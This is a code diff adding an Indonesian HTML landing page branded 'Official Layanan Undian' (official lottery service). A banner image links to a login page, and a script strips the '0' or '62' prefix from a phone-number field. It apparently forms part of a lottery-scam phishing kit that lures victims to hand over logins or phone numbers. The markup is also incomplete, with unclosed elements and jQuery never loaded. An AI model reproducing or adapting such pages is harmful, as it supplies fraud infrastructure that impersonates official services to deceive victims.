@@ -1,0 +1,51 @@
+<html>
+   <head>
+      <meta name="theme-color" content="#ff8736">
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+      <meta property="og:title" content="Official Layanan Undian">
+      <meta http-equiv="X-UA-Compatible" content="ie=edge">
+      <title>Selamat Datang</title>
+      <style>
+         html,
+         body {
+         position: relative;
+         height: 100%;
+         overflow: hidden; 
+         background-color: #ffff00;
+         font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+         font-size: 14px;
+         color: #000;
+         margin: 0;
+         padding: 0;
+         }
+      </style>
+   </head>
+   <body style="background-color: #fff000;">
+      <div style="display:none;" class="index">
+         <div class="header">          
+         </div>
+      </div>
+      <div class="start" style="display:none; background-color: #ffff99;">
+      </div>
+      <div class="container hid">
+      <div class="box-login" style="background-color: #ffff88;">
+      <div id="process" name="process" class="process" style="display: none;">
+         <div class="loading">    
+         </div>
+      </div>
+      <div class="header11">
+         <a href="login.html"><img src="https://otterpage.netlify.app/tm.png" style="width: 100%; left: 0px; top: 0px; border-radius: 0px 0px 80px 0px; border-bottom: 5px solid #FF8601; height: 100%">
+         </a>
+      </div>
+      <script>
+         $(document).ready(function() {
+             $('#inp').on('input', function() {
+                 if ($(this).val() == '0' || $(this).val() == '62') {
+                     $(this).val('');
+                 }
+             });
+         });
+      </script>  
+   </body>
+</html>
